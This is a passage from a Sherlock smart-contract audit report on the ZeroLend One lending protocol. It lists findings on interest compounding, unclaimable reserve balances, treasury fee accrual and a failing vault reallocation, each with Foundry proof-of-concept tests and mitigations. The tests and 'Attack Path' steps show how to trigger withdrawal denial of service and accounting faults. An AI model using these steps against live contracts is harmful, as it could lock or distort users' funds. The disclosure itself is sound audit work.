    │   │   │   │   └─ ← [Return] Pool: [0x4f22fB6CDf1485baf7B25c58c66CdA38f88Acbc3]
    │   │   │   ├─ [977] Pool::totalDebt(loanToken: [0xE18de8003234FcA1f7d57713877F92F482D1a1c3]) [delegatecall]
    │   │   │   │   └─ ← [Return] 1001014212590245764091 [1.001e21]
    │   │   │   └─ ← [Return] 1001014212590245764091 [1.001e21]
    │   │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
    │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
```
This occurs in the function below, as outlined in the report.
```solidity
function _withdrawable(
    IPool pool,
    uint256 totalSupplyAssets,
    uint256 totalBorrowAssets,
    uint256 supplyAssets
  ) internal view returns (uint256) {
    // Inside a flashloan callback, liquidity on the pool may be limited to the singleton's balance.
    uint256 availableLiquidity = UtilsLib.min(totalSupplyAssets - totalBorrowAssets, IERC20(asset()).balanceOf(address(pool)));
    return UtilsLib.min(supplyAssets, availableLiquidity);
  }
```
It's worth to note that user `U1` can withdraw `mintAmount` from the next market(`allMarkets[0]`) but the `withdrawal` is reverted.
> request poc
> 
> Seems invalid, can the DoS be of more than 7 days? Does it meet sherlock rules of DoS? i.e
> 
> * Must break core contract functionality
> * Must DoS funds for more than a week without any form of admin retrieval
> * Must be a time sensitive function

- Clearly, this is core functionality of the `curated vault` since `depositing` and `withdrawing` are the primary entry points for an `ERC4626 vault`. 
- As I mentioned, resolving this issue is challenging.
  As a one possible solution, the `owner` can remove a `pool` from the `withdrawQueue`, which could lead to `depositors` losing their funds. 
  Without addressing this problem, there's no certainty as to when the `total assets` will once again exceed the `total debt` in that `pool`. 
- I believe that `withdrawals` are highly time-sensitive. 
  What happens if a user's `withdrawal` request is reverted in the `vault`, and they urgently need their funds?

# Issue M-16: Pool supply interest compounds randomly based on the frequency of `ReserveLogic::updateState()` calls, resulting in inconsistant and unexpected returns for suppliers 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/428 

## Found by 
Nihavent
### Summary

`_updateIndexes()` considers the previously earned interest on supplies as principle on the next update, resulting in a random compounding effect on interest earned. Borrowers may be incentivized to call `forceUpdateReserve()` frequently if gas costs are low relative to the upside of compounding their interest. 

### Root Cause

Any time an action calls `ReserveLogic::updateState()`, [`ReserveLogic::_updateIndexes()` is called](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L91). Note this occurs before important state-changing pool actions as well as through public/external functions such as [`Pool::forceUpdateReserve()`](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/Pool.sol#L161-L165) and [`Pool::forceUpdateReserves()`](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/Pool.sol#L168-L172).

`_updateIndexes()` calculates lienar interest since the last update and uses this to [scale up the `_cache.currLiquidityIndex` and assigns to `_cache.nextLiquidityIndex`](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L225-L227):

```javascript
  function _updateIndexes(DataTypes.ReserveData storage _reserve, DataTypes.ReserveCache memory _cache) internal {
    ... SKIP!...

    if (_cache.currLiquidityRate != 0) {
@>    uint256 cumulatedLiquidityInterest = MathUtils.calculateLinearInterest(_cache.currLiquidityRate, _cache.reserveLastUpdateTimestamp);
      _cache.nextLiquidityIndex = cumulatedLiquidityInterest.rayMul(_cache.currLiquidityIndex).toUint128();
      _reserve.liquidityIndex = _cache.nextLiquidityIndex;
    }

    ... SKIP!...
  }
```

This creates a compounding-effect on an intended simple interest calculated, based on the frequency it's called. This is due to the interest accumulated on the last refresh being considered principle on the next refresh.

### Internal pre-conditions

1. Pool functions normally with supply/borrow/repay calls

### External pre-conditions

_No response_

### Attack Path

1. Supplier supplies assets
2. Borrower takes debt against supplier's assets and pays interest
3. Indexes are updated at some frequency
4. Supplier earns compound-like interest on their supplied assets 


### Impact

- Suppliers receive compound-interest on their supplied assets instead of the intended fixed/linear interest.

### PoC

Create a new file in /test/forge/core/pool and paste the below contents.

Run command `forge test --mt test_POC_InterestRateIndexCalc -vv` to see the following logs which show the more frequently the update, the more compounding-like the `liquidityIndex` becomes.

```javascript
Ran 3 tests for test/forge/core/pool/RandomCompoundingInterestPOC.t.sol:PoolSupplyRandomCompoundingEffect
[PASS] test_POC_InterestRateIndexCalc_1_singleUpdate() (gas: 740335)
Logs:
  Updates once after a year: liquidityIndex 1.333e27
  Updates once after a year: borrowIndex 1.446891914398940457716504e27

[PASS] test_POC_InterestRateIndexCalc_2_monthlyUpdates() (gas: 1094439)
Logs:
  Updates monthly for a year: liquidityIndex 1.388987876426245531179679454e27
  Updates monthly for a year: borrowIndex 1.447734004896004725108257228e27

[PASS] test_POC_InterestRateIndexCalc_3_dailyUpdates() (gas: 65326938)
Logs:
  Updates every four hours for a year: liquidityIndex 1.395111981380752339971733874e27
  Updates every four hours for a year: borrowIndex 1.447734611520782405003308237e27
```


```javascript
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.19;

import {console2} from 'forge-std/src/Test.sol';
import {PoolLiquidationTest} from './PoolLiquidationTests.t.sol';

contract PoolSupplyRandomCompoundingEffect is PoolLiquidationTest {

  function test_POC_InterestRateIndexCalc_1_singleUpdate() public {
    _mintAndApprove(alice, tokenA, 10_000e18, address(pool)); // alice 10k tokenA
    _mintAndApprove(bob, tokenB, mintAmountB, address(pool)); // bob 2000 tokenB

    vm.startPrank(alice);
    pool.supplySimple(address(tokenA), alice, 10_000e18, 0); // 10k tokenA alice supply
    vm.stopPrank();

    vm.startPrank(bob);
    pool.supplySimple(address(tokenB), bob, supplyAmountB, 0); // 750 tokenB bob supply
    vm.stopPrank();

    vm.startPrank(alice);
    pool.borrowSimple(address(tokenB), alice, supplyAmountB, 0); // 750 tokenB borrow for 100% utilization
    vm.stopPrank();

    vm.warp(block.timestamp + 365 days);
    
    pool.forceUpdateReserves(); // updates indicies

    console2.log('Updates once after a year: liquidityIndex %e', pool.getReserveData(address(tokenB)).liquidityIndex);
    console2.log('Updates once after a year: borrowIndex %e', pool.getReserveData(address(tokenB)).borrowIndex);
  }

  function test_POC_InterestRateIndexCalc_2_monthlyUpdates() public {
    _mintAndApprove(alice, tokenA, 10_000e18, address(pool)); // alice 10k tokenA
    _mintAndApprove(bob, tokenB, mintAmountB, address(pool)); // bob 2000 tokenB

    vm.startPrank(alice);
    pool.supplySimple(address(tokenA), alice, 10_000e18, 0); // 10k tokenA alice supply
    vm.stopPrank();

    vm.startPrank(bob);
    pool.supplySimple(address(tokenB), bob, supplyAmountB, 0); // 750 tokenB bob supply
    vm.stopPrank();

    vm.startPrank(alice);
    pool.borrowSimple(address(tokenB), alice, supplyAmountB, 0); // 750 tokenB borrow for 100% utilization
    vm.stopPrank();

    for(uint256 i = 0; i < 12; i++) {
        vm.warp(block.timestamp + (30 * 24 * 60 * 60));
        pool.forceUpdateReserves(); // updates indicies
    }
    vm.warp(block.timestamp + (5 * 24 * 60 * 60)); // Final 5 days
    pool.forceUpdateReserves(); // updates indicies

    console2.log('Updates monthly for a year: liquidityIndex %e', pool.getReserveData(address(tokenB)).liquidityIndex);
    console2.log('Updates monthly for a year: borrowIndex %e', pool.getReserveData(address(tokenB)).borrowIndex);

  }

  function test_POC_InterestRateIndexCalc_3_dailyUpdates() public {
    _mintAndApprove(alice, tokenA, 10_000e18, address(pool)); // alice 10k tokenA
    _mintAndApprove(bob, tokenB, mintAmountB, address(pool)); // bob 2000 tokenB

    vm.startPrank(alice);
    pool.supplySimple(address(tokenA), alice, 10_000e18, 0); // 10k tokenA alice supply
    vm.stopPrank();

    vm.startPrank(bob);
    pool.supplySimple(address(tokenB), bob, supplyAmountB, 0); // 750 tokenB bob supply
    vm.stopPrank();

    vm.startPrank(alice);
    pool.borrowSimple(address(tokenB), alice, supplyAmountB, 0); // 750 tokenB borrow for 100% utilization
    vm.stopPrank();

    for(uint256 i = 0; i < (6 * 365); i++) {
        vm.warp(block.timestamp + (4 * 60 * 60));
        pool.forceUpdateReserves(); // updates indicies
    }

    console2.log('Updates every four hours for a year: liquidityIndex %e', pool.getReserveData(address(tokenB)).liquidityIndex);
    console2.log('Updates every four hours for a year: borrowIndex %e', pool.getReserveData(address(tokenB)).borrowIndex);
  }
}
```

### Mitigation

- Track the principle and the interest separately. Accrue simple interest on the principle only.

# Issue M-17: Unclaimable reserve assets will accrue in a pool due to the difference between interest paid on borrows and interest earned on supplies 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/429 

## Found by 
Nihavent, iamnmt
### Summary

The interest paid on borrows is calculated in a compounding fashion, but the interest earned on supplying assets is calculated in a fixed way. As a result more interest will be repaid by borrowers than is claimable by suppliers. This buildup of balance never gets rebased into the `liquidityIndex`, nor is it claimable with some sort of 'skim' function.

### Root Cause

Any time an action calls `ReserveLogic::updateState()`, [`ReserveLogic::_updateIndexes()` is called](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L91).

In `_updateIndexes()`, the `_cache.nextLiquidityIndex` is a [scaled up](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L226) version of `_cache.currLiquidityIndex` based on the 'linear interest' [calculated in `MathUtils::calculateLinearInterest()`](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L225).

[`calculateLinearInterest`](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/utils/MathUtils.sol#L34-L42) scales a fixed interest annual interest rate by the amount of time elapsed since the last call:

```javascript
  function calculateLinearInterest(uint256 rate, uint40 lastUpdateTimestamp) internal view returns (uint256) {
    //solium-disable-next-line
    uint256 result = rate * (block.timestamp - uint256(lastUpdateTimestamp));
    unchecked {
      result = result / SECONDS_PER_YEAR;
    }

    return WadRayMath.RAY + result;
  }
```


Similarly, the `_cache.nextBorrowIndex` is a [scaled up](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L236) version of `_cache.currBorrowIndex` based on the 'compound interest' [calculated in `MathUtils::calculateCompoundedInterest()`](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L235).

[`calculateCompoundedInterest`](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/utils/MathUtils.sol#L58C12-L89) compounds a rate based on the time elapsed since it was last called:

```javascript
  function calculateCompoundedInterest(uint256 rate, uint40 lastUpdateTimestamp, uint256 currentTimestamp) internal pure returns (uint256) {
    //solium-disable-next-line
    uint256 exp = currentTimestamp - uint256(lastUpdateTimestamp);

    if (exp == 0) {
      return WadRayMath.RAY;
    }

    uint256 expMinusOne;
    uint256 expMinusTwo;
    uint256 basePowerTwo;
    uint256 basePowerThree;
    unchecked {
      expMinusOne = exp - 1;
      expMinusTwo = exp > 2 ? exp - 2 : 0;

      basePowerTwo = rate.rayMul(rate) / (SECONDS_PER_YEAR * SECONDS_PER_YEAR);
      basePowerThree = basePowerTwo.rayMul(rate) / SECONDS_PER_YEAR;
    }

    uint256 secondTerm = exp * expMinusOne * basePowerTwo;
    unchecked {
      secondTerm /= 2;
    }
    uint256 thirdTerm = exp * expMinusOne * expMinusTwo * basePowerThree;
    unchecked {
      thirdTerm /= 6;
    }

    return WadRayMath.RAY + (rate * exp) / SECONDS_PER_YEAR + secondTerm + thirdTerm;
  }
```

As a result, more interest is payable on debt than is earned on supplied liquidity. This is a design choice by the protocol, however without a function to 'skim' this extra interest, these tokens will buildup and are locked in the protocol. 

### Internal pre-conditions

1. Pool operates normally with supplies/borrows/repays
2. `updateState()` must NOT be called every second, as this would create a compounding-effect on the 'linear rate' such that the difference in interest paid on debts is equal to the interest earned on supplies.

### External pre-conditions

_No response_

### Attack Path

1. Several users supply tokens to a pool as normal
2. Users borrow against the liquidity
3. Time passes, all borrows are repaid
4. All suppliers withdraw their funds (as part of this operation the treasury also withdraws their fee assets)
5. A pool remains with 0 supplyShares and 0 debtShares, but still has a token balance which is unclaimable by anyone

### Impact

1. Token buildup in contract is unclaimable by anyone
   - The built up token balance can be borrowed and flash loaned, leading to compounding build up of unclaimable liquidity


### PoC

Create a new file in /test/forge/core/pool and paste the below contents. The test shows a simple supply/borrow/warp/repay flow. After the actions are complete, the pool has more `tokenB` than is claimable by the supplier and the treasury. These tokens are now locked in the contract 

```javascript
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.19;

import {console2} from 'forge-std/src/Test.sol';
import {PoolLiquidationTest} from './PoolLiquidationTests.t.sol';

contract AuditUnclaimableBalanceBuildupOnPool is PoolLiquidationTest {

  function test_POC_UnclaimableBalanceBuildupOnPool () public {
    uint256 aliceMintAmount = 10_000e18;
    uint256 bobMintAmount = 10_000e18;
    uint256 supplyAmount = 1000e18;
    uint256 borrowAmount = 1000e18;

    _mintAndApprove(alice, tokenA, aliceMintAmount, address(pool));         // alice collateral
    _mintAndApprove(bob, tokenB, bobMintAmount, address(pool));             // bob supply
    _mintAndApprove(alice, tokenB, aliceMintAmount, address(pool));         // alice needs some funds to pay interest

    vm.startPrank(bob);
    pool.supplySimple(address(tokenB), bob, supplyAmount, 0); 
    vm.stopPrank();

    vm.startPrank(alice);
    pool.supplySimple(address(tokenA), alice, aliceMintAmount, 0);  // alice collateral
    pool.borrowSimple(address(tokenB), alice, borrowAmount, 0);     // 100% utilization
    vm.stopPrank();

    vm.warp(block.timestamp + 365 days); // Time passes, interest accrues, treasury shares accrue
    pool.forceUpdateReserves();

    // Alice full repay
    vm.startPrank(alice);
    tokenB.approve(address(pool), type(uint256).max);
    pool.repaySimple(address(tokenB), type(uint256).max, 0);

    (,,, uint256 debtShares) = pool.marketBalances(address(tokenB));
    // All debt has been repaid
    assert(debtShares == 0); 

    // Bob's claim on pool's tokenB
    bytes32 bobPos = keccak256(abi.encodePacked(bob, 'index', uint256(0)));
    uint256 BobsMaxWithdrawAssets = pool.supplyShares(address(tokenB), bobPos) * pool.getReserveData(address(tokenB)).liquidityIndex / 1e27;

    // Treasury claim on pool's tokenB
    uint256 accruedTreasuryAssets = pool.getReserveData(address(tokenB)).accruedToTreasuryShares * pool.getReserveData(address(tokenB)).liquidityIndex / 1e27;

    // Total balance of pool's tokenB
    uint256 poolTokenBBalance = tokenB.balanceOf(address(pool));

    assert(poolTokenBBalance > BobsMaxWithdrawAssets + accruedTreasuryAssets); // There are more tokenB on the pool than all suppliers + treasury claim. 
  }

}
```

### Mitigation

One option is to create a function which claims the latent funds to the treasury, callable by an owner
- Calls `forceUpdateReserves()`
- Calls `executeMintToTreasury()`
- Calculates the latent funds on a pool's reserve (something like `tokenA.balanceOf(pool) - ( totalSupplyShares * liquidityIndex )`)
- Sends these funds to the treasury

Another option would be to occasionally rebase `liquidityIndex` to increase the value of supplyShares so supplies have a claim on these extra funds.

In both cases it may be sensible to leave some dust as a buffer. 

# Issue M-18: Supply interest is earned on `accruedToTreasuryShares` resulting in higher than expected treasury fees and under rare circumstances DOSed pool withdrawals 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/430 

## Found by 
0xAlix2, A2-security, Bigsam, Nihavent, Ocean\_Sky, thisvishalsingh
### Summary

Fees on debt interest are calculated in 'assets', but not claimed immediately and stored as shares. When they're claimed, they're treated as regular supplyShares and converted back to assets based on the `liquidityIndex` at the time they're claimed. This results in the realized fees being higher than expected, and under an extreme scenario may not leave enough liquidity for regular pool suppliers to withdraw their funds.

### Root Cause

Each time a pool's reserve state is updated, [`ReserveLogic::_accrueToTreasury()` is called](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L92).
This function incriments `_reserve.accruedToTreasuryShares` by the shares equiavalent of the assets taken as a fee. Note `vars.amountToMint` is in assets, and `_reserve.accruedToTreasuryShares` is stored in shares as the 'fee assets' are not always immediately sent to the treasury.

```javascript
  function _accrueToTreasury(uint256 reserveFactor, DataTypes.ReserveData storage _reserve, DataTypes.ReserveCache memory _cache) internal {
    ... SKIP!...

    vars.amountToMint = vars.totalDebtAccrued.percentMul(reserveFactor); // Assets

@>  if (vars.amountToMint != 0) _reserve.accruedToTreasuryShares += vars.amountToMint.rayDiv(_cache.nextLiquidityIndex).toUint128(); // Shares
  }
```

When any pool withdrawal is executed, [`PoolLogic::executeMintToTreasury()` is called](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/PoolSetters.sol#L84). The stored shares are converted back to assets based on the current `liquidityIndex`:

```javascript
  function executeMintToTreasury(
    DataTypes.ReserveSupplies storage totalSupply,
    mapping(address => DataTypes.ReserveData) storage reservesData,
    address treasury,
    address asset
  ) external {
    DataTypes.ReserveData storage reserve = reservesData[asset];

    uint256 accruedToTreasuryShares = reserve.accruedToTreasuryShares;

    if (accruedToTreasuryShares != 0) {
      reserve.accruedToTreasuryShares = 0;
      uint256 normalizedIncome = reserve.getNormalizedIncome();
      uint256 amountToMint = accruedToTreasuryShares.rayMul(normalizedIncome); // Assets, scaled up by current liquidityIndex

      IERC20(asset).safeTransfer(treasury, amountToMint);
      totalSupply.supplyShares -= accruedToTreasuryShares;

      emit PoolEventsLib.MintedToTreasury(asset, amountToMint);
    }
  }
```

As a result, the actual fee taken by the treasury exceeds the original x% intended by `reserveFactor` at the time the debt was repaid.

In addition, the accumulation of interest on these `accruedToTreasuryShares` can lead to pool withdrawals being DOSed under circumstances where the `_updateIndexes()` is called close to every second to create a compounding effect. This compounding effect on brings the `liquidityIndex` closer to the `borrowIndex`. This results in the interest earned on `accruedToTreasuryShares` causing the pool to run out of liquidity when suppliers withdraw.

### Internal pre-conditions

Impact 1 
1. A pool has a non-zero `reserveFactor`
2. Pool operates normally with supplies/borrows/repays

Impact 2
1. A pool has a non-zero `reserveFactor`
2. Pool operates normally with supplies/borrows/repays
3. `_updateIndexes()` is called each second (or close to)

### External pre-conditions

_No response_

### Attack Path

Impact 2
1. User1 supplies to a pool
2. User2 borrows from the same pool
3. As time elapses, `_updateIndexes()` is called close to every second, bringing `liquidityIndex` closer to `borrowIndex`. Note this is callable from an external function `Pool::forceUpdateReserves()`
4. User2 repays their borrow including interest
5. Repeat step 3 just for a few seconds
6. User1 attempts to withdraw their balance but due to the accrued interest on `accruedToTreasuryShares`, the pool runs out of liquidity DOSing the withdrawal.

### Impact

1. Generally speaking, in all pools the treasury will end up taking a larger fee than what was set in `reserveFactor`. That is, if `reserveFactor` is 1e3 (10%) and 1e18 interest is earned, the protocol will eventually claim more than 10% * 1e18 assets.
2. Under a specific scenario where `_updateIndexes()` is called every second, there will not be enough liquidity for suppliers to withdraw because the treasury earning supply interest on their `accruedToTreasuryShares` is not accounted for.

### PoC

The below coded POC implements the 'Attack Path' described above.

First, add this line to the `CorePoolTests::_setUpCorePool()` function to create a scenario with a non-zero reserve factor:

```diff
  function _setUpCorePool() internal {
    poolImplementation = new Pool();

    poolFactory = new PoolFactory(address(poolImplementation));
+   poolFactory.setReserveFactor(1e3); // 10%
    configurator = new PoolConfigurator(address(poolFactory));

    ... SKIP!...
  }
```

Then, create a new file on /test/forge/core/pool and paste the below contents.

```javascript
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.19;

import {console2} from 'forge-std/src/Test.sol';
import {PoolLiquidationTest} from './PoolLiquidationTests.t.sol';

contract AuditHighSupplyRateDosWithdrawals is PoolLiquidationTest {

function test_POC_DosedWithdrawalsDueToTreasurySharesAccruing() public {
    uint256 aliceMintAmount = 10_000e18;
    uint256 bobMintAmount = 10_000e18;
    uint256 supplyAmount = 1000e18;
    uint256 borrowAmount = 1000e18;

    _mintAndApprove(alice, tokenA, aliceMintAmount, address(pool));         // alice collateral
    _mintAndApprove(bob, tokenB, bobMintAmount, address(pool));             // bob supply
    _mintAndApprove(alice, tokenB, aliceMintAmount, address(pool));         // alice needs some funds to pay interest

    vm.startPrank(bob);
    pool.supplySimple(address(tokenB), bob, supplyAmount, 0); 
    vm.stopPrank();

    vm.startPrank(alice);
    pool.supplySimple(address(tokenA), alice, aliceMintAmount, 0);  // alice collateral
    pool.borrowSimple(address(tokenB), alice, borrowAmount, 0);     // 100% utilization
    vm.stopPrank();

    for(uint256 i = 0; i < (12 * 60 * 60); i++) { // Each second `_updateIndexes()` is called via external function `forceUpdateReserves()`
        vm.warp(block.timestamp + 1);
        pool.forceUpdateReserves();
    }

    // Alice full repay
    vm.startPrank(alice);
    tokenB.approve(address(pool), type(uint256).max);
    pool.repaySimple(address(tokenB), type(uint256).max, 0);
    uint256 post_aliceTokenBBalance = tokenB.balanceOf(alice);
    uint256 interestRepaidByAlice = aliceMintAmount - post_aliceTokenBBalance;

    for(uint256 i = 0; i < (60); i++) { // warp after for treasury to accrue interest on their 'fee shares' 
        vm.warp(block.timestamp + 1);
        pool.forceUpdateReserves();
    }

    // Check debt has been repaid
    (, , , uint256 debtShares) = pool.marketBalances(address(tokenB));
    assert(debtShares == 0); // All debt has been repaid

    // Treasury assets to claim
    uint256 treasuryAssetsToClaim = pool.getReserveData(address(tokenB)).accruedToTreasuryShares * pool.getReserveData(address(tokenB)).liquidityIndex / 1e27;

    // Bob's assets to claim
    bytes32 bobPos = keccak256(abi.encodePacked(bob, 'index', uint256(0)));
    uint256 bobsAssets = pool.supplyShares(address(tokenB), bobPos) * pool.getReserveData(address(tokenB)).liquidityIndex / 1e27;

    // Impact 1: the interest claimable by the treasury is greater than 10% of the interest repaid
    assert(treasuryAssetsToClaim > pool.factory().reserveFactor() * interestRepaidByAlice / 1e4);

    // Impact 2: Bob & the treasury's claim on the assets is greater than available assets, despite no outstanding debt. 
    // This assert demonstrates that bob's withdrawal would be DOSed as withdrawal calls include a transfer of treasury assets.
    // The withdrawal DOS cannot be shown due to the call reverting due to the 'share underflow' issue described in another report
    uint256 poolLiquidity = tokenB.balanceOf(address(pool));
    assert(bobsAssets + treasuryAssetsToClaim > poolLiquidity); 
  }
}
```

### Mitigation

Three possible solutions:
1. Immediately send the 'fee assets' to treasury rather than accruing them over time
2. Store the 'fee assets' in assets instead of shares. This will correctly capture the amount of fee that is intended by `reserveFactor`. For example if a fee is 10%, the protocol will take exactly 10% of the interest earned on debt.
3. Account for the creation of new `supplyShares` by diluting the `liquidityIndex` upon creating these shares. This solution will allow the conversion back to assets in `executeMintToTreasury()` to remain unchanged.
   - Note I acknowledge that the [calculation of `liquidityRate`](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/periphery/ir/DefaultReserveInterestRateStrategy.sol#L126-L128) does account for `reserveFactor`, however given this is out of scope I did not focus on it. Regardless, it does not scale the rate down enough to account for the interest the treasury will earn on these shares. 



## Discussion

**sherlock-admin2**

1 comment(s) were left on this issue during the judging contest.

**Honour** commented:
>  Invalid: fees can accrue interest as well as is done in AAVE



# Issue M-19: Curated Vault allocators cannot `reallocate()` a pool to zero due to attempting to withdraw 0 tokens from the underlying pool 

Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/434 

## Found by 
000000, 0xAristos, 0xc0ffEE, A2-security, CL001, KupiaSec, Nihavent, Obsidian, Varun\_05, aman, dany.armstrong90, hyh, iamnmt, karsar, rilwan99, stuart\_the\_minion, theweb3mechanic, trachev, wickie, zarkk01
### Summary

The `reallocate()` function is the primary way a curated vault can remove liquidity from an underlying pool, so being unable to fully remove the liquidity is problematic. However, due to a logic issue in the implementation, any attempt to `reallocate()` liquidity in a pool to zero will revert. 

### Root Cause

The function `CuratedVault::reallocate()` is callable by an allocator and reallocates funds between underlying pools. As shown below, `toWithdraw` is the difference between `supplyAssets` (total assets in the underlying pool controlled by the curated vault) and the `allocation.assets` which is the target allocation for this pool. Therefore, if `toWithdraw` is greater than zero, a withdrawal is required from that pool:

```javascript
  function reallocate(MarketAllocation[] calldata allocations) external onlyAllocator {
    uint256 totalSupplied;
    uint256 totalWithdrawn;

    for (uint256 i; i < allocations.length; ++i) {
      MarketAllocation memory allocation = allocations[i];
      IPool pool = allocation.market;

      (uint256 supplyAssets, uint256 supplyShares) = _accruedSupplyBalance(pool);
@>    uint256 toWithdraw = supplyAssets.zeroFloorSub(allocation.assets);

      if (toWithdraw > 0) {
        if (!config[pool].enabled) revert CuratedErrorsLib.MarketNotEnabled(pool);

        // Guarantees that unknown frontrunning donations can be withdrawn, in order to disable a market.
        uint256 shares;
        if (allocation.assets == 0) {
          shares = supplyShares;
@>        toWithdraw = 0;
        }

@>      DataTypes.SharesType memory burnt = pool.withdrawSimple(asset(), address(this), toWithdraw, 0);
        emit CuratedEventsLib.ReallocateWithdraw(_msgSender(), pool, burnt.assets, burnt.shares);
        totalWithdrawn += burnt.assets;
      } else {
        
        ... SKIP!...
      }
    }
```

The issue arrises when for any given pool, `allocation.assets` is set to 0, meaning the allocator wishes to empty that pool and allocate the liquidity to another pool. Under this scenario, `toWithdraw` is set to 0, and passed into `Pool::withdrawSimple()`. This is a logic mistake to attempt to withdraw 0 instead of the `supplyAssets` when attempting to withdraw all liquidity to a pool. The call will revert due to a [check](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ValidationLogic.sol#L97) in the pool's withdraw flow that ensures the amount being withdrawn is greater than 0.

It seems this bug is a result of forking the Metamorpho codebase which [implements the same logic](https://github.com/morpho-org/metamorpho/blob/cc6b01610c9b0000d965faef705e1670859d9c0f/src/MetaMorpho.sol#L382-L389). However, Metamorpho's underlying withdraw() function [can take either an asset amount or share amount](https://github.com/morpho-org/morpho-blue/blob/0448402af51b8293ed36653de43cbee8d4d2bfda/src/Morpho.sol#L216-L217), but ZeroLend's `Pool::withdrawSimple()` only [accepts an amount of assets](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/Pool.sol#L94). 

### Internal pre-conditions

1. A curated vault having more than 1 underlying pool in the `supplyQueue`

### External pre-conditions

_No response_

### Attack Path

1. A curated vault is setup with more than 1 underlying pool in the `supplyQueue`
2. An allocator wishes to reallocate all the supplied liquidity from one pool to another
3. The allocator calls constructs the array of `MarketAllocation` withdrawing all liquidity from the first pool and depositing the same amount to the second pool
4. The action fails due to the described bug

### Impact

- Allocators cannot remove all liquidity in a pool throuhg the `reallocate()` function. The natspec comments indicate that emptying a pool to zero through the `reallocate()` function is the [first step of the intended way to remove a pool](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/interfaces/vaults/ICuratedVaultBase.sol#L141-L142).  

### PoC

Paste and run the below test in /test/forge/core/vaults/. It shows a simple 2-pool vault with a single depositors. An allocator attempts to reallocate the liquidity in the first pool to the second pool, but reverts due to the described issue.

```javascript
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {Math} from '@openzeppelin/contracts/utils/math/Math.sol';
import './helpers/IntegrationVaultTest.sol';
import {console2} from 'forge-std/src/Test.sol';
import {MarketAllocation} from '../../../../contracts/interfaces/vaults/ICuratedVaultBase.sol';

contract POC_AllocatorCannotReallocateToZero is IntegrationVaultTest {
  function setUp() public {
    _setUpVault();
    _setCap(allMarkets[0], CAP);
    _sortSupplyQueueIdleLast();

    oracleB.updateRoundTimestamp();
    oracle.updateRoundTimestamp();
  }

  function test_POC_AllocatorCannotReallocateToZero() public {

    // 1. supplier supplies to underlying pool through curated vault
    uint256 assets = 10e18;
    loanToken.mint(supplier, assets);

    vm.startPrank(supplier);
    uint256 shares = vault.deposit(assets, onBehalf);
    vm.stopPrank();

    // 2. Allocator attempts to reallocate all of these funds to another pool
    MarketAllocation[] memory allocations = new MarketAllocation[](2);
    
    allocations[0] = MarketAllocation({
        market: vault.supplyQueue(0),
        assets: 0
    });

    // Fill in the second MarketAllocation struct
    allocations[1] = MarketAllocation({
        market: vault.supplyQueue(1),
        assets: assets
    });

    vm.startPrank(allocator);
    vm.expectRevert("NOT_ENOUGH_AVAILABLE_USER_BALANCE");
    vault.reallocate(allocations); // Reverts due to attempting a withdrawal amount of 0
  }
}
```

### Mitigation

The comment "Guarantees that unknown frontrunning donations can be withdrawn, in order to disable a market" does not seem to apply to Zerolend pools as a donation to the pool would not disable the market, nor would it affect the amount of assets the curated vault can withdraw from the underlying pool. With this in mind, Metamorpho's safety check can be removed:

```diff
  function reallocate(MarketAllocation[] calldata allocations) external onlyAllocator {
    uint256 totalSupplied;
    uint256 totalWithdrawn;


    for (uint256 i; i < allocations.length; ++i) {
      MarketAllocation memory allocation = allocations[i];
      IPool pool = allocation.market;

      (uint256 supplyAssets, uint256 supplyShares) = _accruedSupplyBalance(pool);
      uint256 toWithdraw = supplyAssets.zeroFloorSub(allocation.assets);

      if (toWithdraw > 0) {
        if (!config[pool].enabled) revert CuratedErrorsLib.MarketNotEnabled(pool);


-       // Guarantees that unknown frontrunning donations can be withdrawn, in order to disable a market.
-       uint256 shares;
-       if (allocation.assets == 0) {
-         shares = supplyShares;
-         toWithdraw = 0;
-       }

        DataTypes.SharesType memory burnt = pool.withdrawSimple(asset(), address(this), toWithdraw, 0);
        emit CuratedEventsLib.ReallocateWithdraw(_msgSender(), pool, burnt.assets, burnt.shares);
        totalWithdrawn += burnt.assets;
      } else {
        uint256 suppliedAssets =
          allocation.assets == type(uint256).max ? totalWithdrawn.zeroFloorSub(totalSupplied) : allocation.assets.zeroFloorSub(supplyAssets);

        if (suppliedAssets == 0) continue;

        uint256 supplyCap = config[pool].cap;
        if (supplyCap == 0) revert CuratedErrorsLib.UnauthorizedMarket(pool);

